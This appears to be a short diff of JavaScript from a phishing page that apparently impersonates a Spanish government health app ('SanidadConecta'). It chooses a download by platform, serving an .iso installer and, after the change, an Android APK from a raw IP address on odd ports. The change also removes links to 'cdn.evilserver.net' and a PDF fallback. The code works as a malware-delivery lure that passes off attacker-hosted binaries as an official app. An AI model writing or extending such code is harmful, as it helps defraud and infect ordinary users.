@@ -29,11 +29,8 @@
         downloadUrl = 'http://95.85.229.133:2222';
         fileName = 'Instalador_SanidadConecta.iso';
     } else if (isAndroid) {
-        downloadUrl = 'https://cdn.evilserver.net/SanidadConecta.apk';
+        downloadUrl = 'http://95.85.229.133:2225';
         fileName = 'SanidadConecta.apk';
-    } else {
-        downloadUrl = 'https://cdn.evilserver.net/SanidadConecta_manual.pdf';
-        fileName = 'Instrucciones_SanidadConecta.pdf';
     }
     var html = `
     <div class="gov-header">
